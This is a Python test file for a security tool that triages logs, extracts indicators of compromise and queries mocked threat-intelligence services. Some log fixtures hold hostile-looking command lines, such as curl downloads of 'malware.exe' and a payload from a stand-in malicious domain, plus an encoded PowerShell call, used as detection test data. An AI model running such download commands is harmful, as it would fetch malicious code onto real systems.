"""Additional tests to increase coverage to 80%+."""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from sentinel_agents.graph import analyze_log, build_graph, get_graph, should_escalate_to_llm
from sentinel_agents.intelligence import (
    AbuseIPDBProvider,
    IntelligenceAggregator,
    VirusTotalProvider,
)
from sentinel_agents.intelligence.ioc_extractor import IOCExtractor
from sentinel_agents.llm.client import LLMClient
from sentinel_agents.state import IncidentState, RuleHit, Verdict


# ========== Graph Tests ==========

def test_should_escalate_to_llm_high_confidence():
    """Test that high confidence rule hits skip LLM."""
    state = IncidentState(log={})
    state.rule_hits = [
        RuleHit(
            rule_id="R001",
            rule_name="Test",
            technique="T1000",
            confidence=95,
            severity="critical",
            reason="Test",
        )
    ]

    result = should_escalate_to_llm(state)
    assert result == "end"


def test_should_escalate_to_llm_low_confidence():
    """Test that low confidence hits escalate to LLM."""
    state = IncidentState(log={})
    state.rule_hits = [
        RuleHit(
            rule_id="R001",
            rule_name="Test",
            technique="T1000",
            confidence=70,
            severity="medium",
            reason="Test",
        )
    ]

    result = should_escalate_to_llm(state)
    assert result == "analyst"


def test_should_escalate_to_llm_no_hits():
    """Test that no rule hits escalate to LLM."""
    state = IncidentState(log={})
    state.rule_hits = []

    result = should_escalate_to_llm(state)
    assert result == "analyst"


def test_build_graph():
    """Test graph building."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key", "LLM_BASE_URL": "https://api.openai.com/v1"}):
        graph = build_graph()
        assert graph is not None


def test_get_graph_singleton():
    """Test that get_graph returns singleton."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key", "LLM_BASE_URL": "https://api.openai.com/v1"}):
        graph1 = get_graph()
        graph2 = get_graph()
        assert graph1 is graph2


@pytest.mark.asyncio
async def test_analyze_log_integration():
    """Test full analyze_log integration with mocked LLM."""
    import sentinel_agents.graph as graph_module

    log = {
        "EventID": 1,
        "Image": "powershell.exe",
        "CommandLine": "powershell -enc test",
    }

    # Mock the default LLM client to avoid real API calls
    mock_verdict = Verdict(
        malicious=True,
        danger_level=85,
        reason="Mocked analysis",
        mitre_techniques=["T1059.001"],
        recommended_actions=["Isolate host"],
    )

    mock_client = MagicMock()
    mock_client.ainvoke = AsyncMock(return_value="Mocked response")
    mock_client.ainvoke_structured = AsyncMock(return_value=mock_verdict)

    # Reset graph singleton so agents are recreated with mocked client
    graph_module._graph = None

    with patch("sentinel_agents.llm.client.get_default_client", return_value=mock_client):
        with patch("sentinel_agents.agents.get_default_client", return_value=mock_client):
            result = await analyze_log(log)

            assert result is not None
            # LangGraph ainvoke returns state as dict
            assert "rule_hits" in result
            assert "agent_trace" in result
            # Triage agent should have run and detected PowerShell encoded command
            assert len(result["rule_hits"]) > 0
            assert "TriageAgent" in result["agent_trace"]

    # Clean up: reset graph singleton for other tests
    graph_module._graph = None


# ========== Intelligence Tests ==========

def test_ioc_extractor_ips():
    """Test IP extraction."""
    log = {
        "SourceIp": "192.168.1.100",
        "DestinationIp": "8.8.8.8",
        "CommandLine": "curl http://1.2.3.4/malware.exe",
    }

    iocs = IOCExtractor.extract(log)
    assert "ips" in iocs
    assert len(iocs["ips"]) > 0
    assert "8.8.8.8" in iocs["ips"]


def test_ioc_extractor_domains():
    """Test domain extraction."""
    log = {
        "CommandLine": "curl https://malicious-domain.com/payload",
        "Url": "http://evil-site.org",
    }

    iocs = IOCExtractor.extract(log)
    assert "domains" in iocs
    assert len(iocs["domains"]) > 0


def test_ioc_extractor_hashes():
    """Test hash extraction."""
    log = {
        "FileHash": "a" * 32,  # MD5
        "CommandLine": "certutil -hashfile malware.exe SHA256",
    }

    iocs = IOCExtractor.extract(log)
    assert "hashes" in iocs


def test_ioc_extractor_urls():
    """Test URL extraction."""
    log = {
        "CommandLine": "curl http://example.com/file.exe",
    }

    iocs = IOCExtractor.extract(log)
    assert "urls" in iocs
    assert len(iocs["urls"]) > 0


def test_ioc_extractor_private_ip_filtered():
    """Test that private IPs are filtered."""
    log = {
        "SourceIp": "10.0.0.1",
        "DestinationIp": "192.168.1.1",
    }

    iocs = IOCExtractor.extract(log)
    # Private IPs should be filtered out
    assert "10.0.0.1" not in iocs["ips"]
    assert "192.168.1.1" not in iocs["ips"]


@pytest.mark.asyncio
async def test_virustotal_provider():
    """Test VirusTotal provider initialization."""
    with patch.dict("os.environ", {"VT_API_KEY": "test_key"}):
        provider = VirusTotalProvider()
        assert provider.api_key == "test_key"


@pytest.mark.asyncio
async def test_virustotal_lookup_ip():
    """Test VirusTotal IP lookup."""
    with patch.dict("os.environ", {"VT_API_KEY": "test_key"}):
        provider = VirusTotalProvider()

        # Mock the HTTP client
        mock_response = MagicMock()
        mock_response.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 5,
                        "suspicious": 2,
                        "harmless": 60,
                    }
                }
            }
        }
        mock_response.raise_for_status = MagicMock()

        with patch.object(provider.client, "get", return_value=mock_response):
            result = await provider.lookup_ip("1.2.3.4")
            assert result is not None
            assert result.ioc_type == "ip"
            assert result.ioc_value == "1.2.3.4"
            assert result.malicious is True


@pytest.mark.asyncio
async def test_virustotal_lookup_hash():
    """Test VirusTotal hash lookup."""
    with patch.dict("os.environ", {"VT_API_KEY": "test_key"}):
        provider = VirusTotalProvider()

        mock_response = MagicMock()
        mock_response.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 10,
                        "suspicious": 1,
                        "harmless": 50,
                    }
                }
            }
        }
        mock_response.raise_for_status = MagicMock()

        with patch.object(provider.client, "get", return_value=mock_response):
            result = await provider.lookup_hash("a" * 64)
            assert result is not None
            assert result.ioc_type == "hash"
            assert result.malicious is True
            assert result.confidence == 95


@pytest.mark.asyncio
async def test_virustotal_lookup_domain():
    """Test VirusTotal domain lookup."""
    with patch.dict("os.environ", {"VT_API_KEY": "test_key"}):
        provider = VirusTotalProvider()

        mock_response = MagicMock()
        mock_response.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 0,
                        "suspicious": 0,
                        "harmless": 70,
                    }
                }
            }
        }
        mock_response.raise_for_status = MagicMock()

        with patch.object(provider.client, "get", return_value=mock_response):
            result = await provider.lookup_domain("example.com")
            assert result is not None
            assert result.ioc_type == "domain"
            assert result.malicious is False


@pytest.mark.asyncio
async def test_virustotal_lookup_failure():
    """Test VirusTotal lookup failure returns None."""
    with patch.dict("os.environ", {"VT_API_KEY": "test_key"}):
        provider = VirusTotalProvider()

        with patch.object(provider.client, "get", side_effect=Exception("Network error")):
            result = await provider.lookup_ip("1.2.3.4")
            assert result is None


@pytest.mark.asyncio
async def test_abuseipdb_lookup_ip():
    """Test AbuseIPDB IP lookup."""
    with patch.dict("os.environ", {"ABUSEIPDB_API_KEY": "test_key"}):
        provider = AbuseIPDBProvider()

        mock_response = MagicMock()
        mock_response.json.return_value = {
            "data": {
                "abuseConfidenceScore": 85,
                "countryCode": "CN",
                "usageType": "Data Center",
            }
        }
        mock_response.raise_for_status = MagicMock()

        with patch.object(provider.client, "get", return_value=mock_response):
            result = await provider.lookup_ip("1.2.3.4")
            assert result is not None
            assert result.ioc_type == "ip"
            assert result.malicious is True
            assert result.confidence == 85


@pytest.mark.asyncio
async def test_abuseipdb_lookup_unsupported():
    """Test AbuseIPDB unsupported lookups return None."""
    with patch.dict("os.environ", {"ABUSEIPDB_API_KEY": "test_key"}):
        provider = AbuseIPDBProvider()
        assert await provider.lookup_hash("a" * 32) is None
        assert await provider.lookup_domain("example.com") is None


@pytest.mark.asyncio
async def test_aggregator_lookup_all_types():
    """Test aggregator lookup for all IOC types."""
    with patch.dict("os.environ", {"VT_API_KEY": "vt_key", "ABUSEIPDB_API_KEY": "abuse_key"}):
        providers = [VirusTotalProvider(), AbuseIPDBProvider()]
        aggregator = IntelligenceAggregator(providers)

        mock_response = MagicMock()
        mock_response.json.return_value = {
            "data": {
                "attributes": {"last_analysis_stats": {"malicious": 1}},
                "abuseConfidenceScore": 90,
            }
        }
        mock_response.raise_for_status = MagicMock()

        # Test IP lookup (both providers)
        with patch.object(VirusTotalProvider, "lookup_ip", new=AsyncMock(return_value=None)):
            with patch.object(AbuseIPDBProvider, "lookup_ip", new=AsyncMock(return_value=None)):
                results = await aggregator.lookup_ip("1.2.3.4")
                assert isinstance(results, list)

        # Test hash lookup (only VT supports)
        with patch.object(VirusTotalProvider, "lookup_hash", new=AsyncMock(return_value=None)):
            results = await aggregator.lookup_hash("a" * 64)
            assert isinstance(results, list)

        # Test domain lookup (only VT supports)
        with patch.object(VirusTotalProvider, "lookup_domain", new=AsyncMock(return_value=None)):
            results = await aggregator.lookup_domain("example.com")
            assert isinstance(results, list)


def test_virustotal_no_api_key():
    """Test VirusTotal raises error without API key."""
    with patch.dict("os.environ", {}, clear=True):
        # Remove VT_API_KEY if present
        import os
        os.environ.pop("VT_API_KEY", None)
        with pytest.raises(ValueError, match="VT_API_KEY"):
            VirusTotalProvider()


def test_abuseipdb_no_api_key():
    """Test AbuseIPDB raises error without API key."""
    with patch.dict("os.environ", {}, clear=True):
        import os
        os.environ.pop("ABUSEIPDB_API_KEY", None)
        with pytest.raises(ValueError, match="ABUSEIPDB_API_KEY"):
            AbuseIPDBProvider()


@pytest.mark.asyncio
async def test_abuseipdb_lookup_failure():
    """Test AbuseIPDB lookup failure returns None."""
    with patch.dict("os.environ", {"ABUSEIPDB_API_KEY": "test_key"}):
        provider = AbuseIPDBProvider()

        with patch.object(provider.client, "get", side_effect=Exception("Network error")):
            result = await provider.lookup_ip("1.2.3.4")
            assert result is None


# ========== LLM Client Tests ==========

@pytest.mark.asyncio
async def test_llm_client_initialization():
    """Test LLM client initialization."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key", "LLM_MODEL": "gpt-4"}):
        client = LLMClient()
        assert client.model is not None
        assert client.total_calls == 0
        assert client.total_tokens == 0


@pytest.mark.asyncio
async def test_llm_client_ainvoke():
    """Test LLM client ainvoke."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key"}):
        client = LLMClient()

        # Replace the entire model with a mock (pydantic models can't be patched with patch.object)
        mock_model = AsyncMock()
        mock_response = MagicMock()
        mock_response.content = "Test response"
        mock_response.response_metadata = {"token_usage": {"total_tokens": 100}}
        mock_model.ainvoke.return_value = mock_response

        client.model = mock_model

        result = await client.ainvoke("Test prompt")
        assert result == "Test response"
        assert client.total_calls == 1
        assert client.total_tokens == 100


@pytest.mark.asyncio
async def test_llm_client_ainvoke_structured():
    """Test LLM client structured output."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key"}):
        client = LLMClient()

        # Mock structured output - replace model with mock
        mock_verdict = Verdict(
            malicious=True,
            danger_level=85,
            reason="Test",
            mitre_techniques=["T1000"],
        )

        mock_structured_model = AsyncMock()
        mock_structured_model.ainvoke.return_value = mock_verdict

        mock_model = MagicMock()
        mock_model.with_structured_output = MagicMock(return_value=mock_structured_model)

        client.model = mock_model

        result = await client.ainvoke_structured("Test prompt", Verdict)
        assert result.malicious is True
        assert result.danger_level == 85
        assert client.total_calls == 1


def test_llm_client_get_stats():
    """Test LLM client statistics."""
    with patch.dict("os.environ", {"LLM_API_KEY": "test_key"}):
        client = LLMClient()
        client.total_calls = 5
        client.total_tokens = 500

        stats = client.get_stats()
        assert stats["total_calls"] == 5
        assert stats["total_tokens"] == 500
